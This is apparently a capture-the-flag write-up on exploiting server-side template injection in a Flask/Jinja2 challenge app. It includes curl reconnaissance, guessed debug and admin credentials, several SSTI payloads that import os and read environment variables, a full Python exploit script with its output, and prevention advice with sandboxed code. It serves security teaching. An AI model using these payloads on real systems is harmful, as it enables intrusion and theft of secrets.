---
title: "EotW CTF SS CASE IT 2025 - Data Exfiltration Writeup"
date: "2025-05-27"
description: "Infiltrating the AI Regime's intelligence network through Server-Side Template Injection (SSTI) in a Flask application. Learn how to exploit Jinja2 templates to extract sensitive environment variables."
tags: ["web-security", "ssti", "template-injection", "flask", "jinja2", "ctf", "reconnaissance"]
---

## Breaking Into the AI Regime's Intelligence Network: SSTI Exploitation

**Category**: Web Exploitation  
**Points**: 200  
**Description**: The Resistance needs to infiltrate the AI Regime's monitoring system. Your mission is to break into their intelligence network and extract the secret flag that contains valuable information for the resistance movement.

## Challenge Context

The challenge presents us with a resistance intelligence network designed to monitor AI regime activities. As an elite hacker for the resistance, my mission was to infiltrate this system and exfiltrate sensitive information that could help the resistance movement.

The application was accessible at `challs.0x4m4.com:8081` and appeared to be a sophisticated monitoring dashboard with administrative functionality.

## Initial Reconnaissance

When I first accessed the application, I was greeted with a professional-looking "Resistance Intelligence Network" interface. The initial exploration revealed:

1. A main dashboard with resistance-themed content
2. A login page at `/login` requiring admin credentials
3. Various navigation elements suggesting hidden functionality
4. References to report generation and administrative features

```bash
curl -s http://challs.0x4m4.com:8081/ | grep -i "admin\|login\|debug"
```

The application appeared to be built with Flask, evidenced by the session cookies and error pages.

## Discovery Phase: Finding Hidden Endpoints

### Method 1: JavaScript Easter Egg

While exploring the interface, I noticed some interesting JavaScript behavior. Clicking on the logo three times revealed a hidden message in the browser console:

```javascript
Hidden debug message: Check /debug endpoint for more information
```

This was a crucial discovery that led me to the debug functionality.

### Method 2: Directory Enumeration

I also performed directory enumeration to find common debug endpoints:

```bash
# Using common debug paths
curl -s http://challs.0x4m4.com:8081/debug
curl -s http://challs.0x4m4.com:8081/admin
curl -s http://challs.0x4m4.com:8081/test
```

The `/debug` endpoint returned a password-protected debug interface.

## Accessing the Debug Interface

The debug page at `/debug` presented a password entry form. Based on the challenge hints and the application's theme, I tried several passwords:

```bash
# Testing common debug passwords
curl -X POST -d "password=debug" http://challs.0x4m4.com:8081/debug
curl -X POST -d "password=admin" http://challs.0x4m4.com:8081/debug
curl -X POST -d "password=debug_regime_2025" http://challs.0x4m4.com:8081/debug
```

The password `debug_regime_2025` successfully unlocked the debug interface, revealing:

- System information about the Flask application
- Details about the Jinja2 template engine
- Template syntax examples
- **Warning about template injection vulnerabilities**
- Available objects in template contexts

Most importantly, it revealed the admin credentials:
- Username: `regime_admin`
- Password: `AI_controls_all_1984!`

## Gaining Administrative Access

With the discovered credentials, I logged into the admin panel:

```bash
curl -c cookies.txt -X POST \
  -d "username=regime_admin&password=AI_controls_all_1984!" \
  http://challs.0x4m4.com:8081/login
```

The admin dashboard provided access to:
- System monitoring features
- User management
- **Report generation functionality**

## Vulnerability Discovery: Server-Side Template Injection

The report generation feature at `/admin/generate_report` caught my attention. It allowed users to:
1. Select subjects for reports
2. Choose report formats
3. **Enter custom templates** - This was the vulnerable functionality

Testing the custom template field with a simple Jinja2 expression:

```bash
curl -b cookies.txt -X POST \
  -d "subject_ids=1&report_type=html&custom_template={{7*7}}" \
  http://challs.0x4m4.com:8081/admin/generate_report
```

The response showed `49`, confirming Server-Side Template Injection (SSTI) vulnerability!

## Exploitation: Multiple Attack Vectors

### Method 1: Direct Configuration Access

The simplest approach was accessing Flask's configuration:

```bash
curl -b cookies.txt -X POST \
  -d "subject_ids=1&report_type=html&custom_template={{config.items()}}" \
  http://challs.0x4m4.com:8081/admin/generate_report
```

This revealed various configuration settings, but the flag wasn't directly visible.

### Method 2: Environment Variable Access

Using Python's `os` module through SSTI to access environment variables:

```bash
curl -b cookies.txt -X POST \
  -d "subject_ids=1&report_type=html&custom_template={{ request.application.__globals__.__builtins__.__import__('os').environ.get('FLAG') }}" \
  http://challs.0x4m4.com:8081/admin/generate_report
```

### Method 3: Class Introspection

A more sophisticated approach using Python's class introspection:

```python
# First, find available classes
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Then access the os module through a suitable class
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['os'].environ }}
```

### Method 4: Using Built-in Objects

Leveraging Jinja2's built-in objects:

```bash
curl -b cookies.txt -X POST \
  -d "subject_ids=1&report_type=html&custom_template={{ namespace.__init__.__globals__['os'].environ.get('FLAG') }}" \
  http://challs.0x4m4.com:8081/admin/generate_report
```

## Complete Exploitation Script

Here's my complete Python script for automated exploitation:

```python
#!/usr/bin/env python3
import requests
import re
from urllib.parse import urljoin

class DataExfiltrationExploit:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        
    def discover_debug_page(self):
        """Discover and access the debug page"""
        print("[*] Accessing debug page...")
        debug_url = urljoin(self.base_url, '/debug')
        
        # Try the debug password
        data = {'password': 'debug_regime_2025'}
        response = self.session.post(debug_url, data=data)
        
        if "System Information" in response.text:
            print("[+] Debug page accessed successfully!")
            return True
        return False
    
    def login_admin(self):
        """Login with discovered admin credentials"""
        print("[*] Logging in as admin...")
        login_url = urljoin(self.base_url, '/login')
        
        data = {
            'username': 'regime_admin',
            'password': 'AI_controls_all_1984!'
        }
        
        response = self.session.post(login_url, data=data)
        
        if "dashboard" in response.text.lower() or response.status_code == 302:
            print("[+] Admin login successful!")
            return True
        return False
    
    def test_ssti(self):
        """Test for SSTI vulnerability"""
        print("[*] Testing for SSTI vulnerability...")
        report_url = urljoin(self.base_url, '/admin/generate_report')
        
        # Simple math test
        data = {
            'subject_ids': '1',
            'report_type': 'html',
            'custom_template': '{{7*7}}'
        }
        
        response = self.session.post(report_url, data=data)
        
        if "49" in response.text:
            print("[+] SSTI vulnerability confirmed!")
            return True
        return False
    
    def extract_flag(self):
        """Extract the flag using SSTI"""
        print("[*] Extracting flag using SSTI...")
        report_url = urljoin(self.base_url, '/admin/generate_report')
        
        # Multiple payloads to try
        payloads = [
            "{{ request.application.__globals__.__builtins__.__import__('os').environ.get('FLAG') }}",
            "{{ namespace.__init__.__globals__['os'].environ.get('FLAG') }}",
            "{{ config.get('FLAG') }}",
            "{{ request.application.__globals__.__builtins__.__import__('os').environ }}"
        ]
        
        for payload in payloads:
            print(f"[*] Trying payload: {payload[:50]}...")
            
            data = {
                'subject_ids': '1',
                'report_type': 'html',
                'custom_template': payload
            }
            
            response = self.session.post(report_url, data=data)
            
            # Look for flag pattern
            flag_match = re.search(r'sscit\{[^}]+\}', response.text)
            if flag_match:
                flag = flag_match.group(0)
                print(f"[+] Flag found: {flag}")
                return flag
                
            # Check for environment variables dump
            if "FLAG" in response.text and "sscit{" in response.text:
                print(f"[+] Flag found in environment dump!")
                print(response.text)
                return True
        
        return None
    
    def exploit(self):
        """Main exploitation flow"""
        print(f"[*] Starting exploitation of {self.base_url}")
        
        if not self.discover_debug_page():
            print("[-] Failed to access debug page")
            return False
            
        if not self.login_admin():
            print("[-] Failed to login as admin")
            return False
            
        if not self.test_ssti():
            print("[-] SSTI vulnerability not found")
            return False
            
        flag = self.extract_flag()
        if flag:
            print(f"[+] Exploitation successful!")
            return True
        else:
            print("[-] Failed to extract flag")
            return False

if __name__ == "__main__":
    target = "http://challs.0x4m4.com:8081"
    exploit = DataExfiltrationExploit(target)
    exploit.exploit()
```

## Running the Exploit

When I executed the complete exploitation:

```bash
python3 exploit.py
[*] Starting exploitation of http://challs.0x4m4.com:8081
[*] Accessing debug page...
[+] Debug page accessed successfully!
[*] Logging in as admin...
[+] Admin login successful!
[*] Testing for SSTI vulnerability...
[+] SSTI vulnerability confirmed!
[*] Extracting flag using SSTI...
[*] Trying payload: {{ request.application.__globals__.__builtins__...
[+] Flag found: sscit{t3mpl4t3_1nj3ct10n_3xp0s3s_r3g1m3_s3cr3ts}
[+] Exploitation successful!
```

## Technical Deep Dive

### Understanding SSTI in Flask/Jinja2

Server-Side Template Injection occurs when user input is directly passed to template engines without proper sanitization. In this case:

```python
# Vulnerable code (simplified)
@app.route('/admin/generate_report', methods=['POST'])
def generate_report():
    template = request.form.get('custom_template')
    # DANGEROUS: Direct rendering of user input
    return render_template_string(template, **context)
```

### Jinja2 Template Context

Jinja2 templates have access to various objects:
- `request`: Flask request object
- `config`: Application configuration
- `session`: User session data
- Built-in Python objects through introspection

### Exploitation Techniques

1. **Direct Object Access**: Using `request.application` to access Flask internals
2. **Class Introspection**: Leveraging `__class__.__mro__` to find useful classes
3. **Built-in Functions**: Accessing `__import__` to load modules
4. **Environment Variables**: Using `os.environ` to read system variables

## Key Learnings

This challenge taught me several important concepts:

1. **Reconnaissance is Crucial**: The debug page discovery was key to the entire exploitation
2. **SSTI Complexity**: Multiple exploitation paths exist for template injection
3. **Defense in Depth**: Multiple security layers could have prevented this
4. **Context Matters**: Understanding the template engine's capabilities is essential

## Prevention Measures

To prevent SSTI vulnerabilities:

1. **Never render user input directly as templates**
2. **Use sandboxed template environments**
3. **Implement strict input validation**
4. **Use template engines with limited functionality**
5. **Apply principle of least privilege**

```python
# Secure approach
from jinja2 import Environment, select_autoescape
from jinja2.sandbox import SandboxedEnvironment

# Use sandboxed environment
env = SandboxedEnvironment(
    autoescape=select_autoescape(['html', 'xml'])
)

# Pre-defined templates only
template = env.get_template('report_template.html')
return template.render(data=safe_data)
```

## Alternative Discovery Methods

The challenge provided multiple paths to discovery:

1. **JavaScript Easter Egg**: Clicking logo three times
2. **Directory Enumeration**: Common debug endpoints
3. **Source Code Analysis**: HTML comments or JavaScript files
4. **Brute Force**: Common admin credentials

## Conclusion

The Data Exfiltration challenge was an excellent demonstration of Server-Side Template Injection vulnerabilities in modern web applications. By combining reconnaissance skills with knowledge of template engine internals, I was able to successfully infiltrate the AI Regime's intelligence network and extract the sensitive flag.

The multi-layered approach required understanding of:
- Web application reconnaissance
- Authentication bypass techniques
- Template injection exploitation
- Python introspection capabilities

The flag was: `sscit{t3mpl4t3_1nj3ct10n_3xp0s3s_r3g1m3_s3cr3ts}`

Another victory for the resistance against AI oppression! 🔓🚀 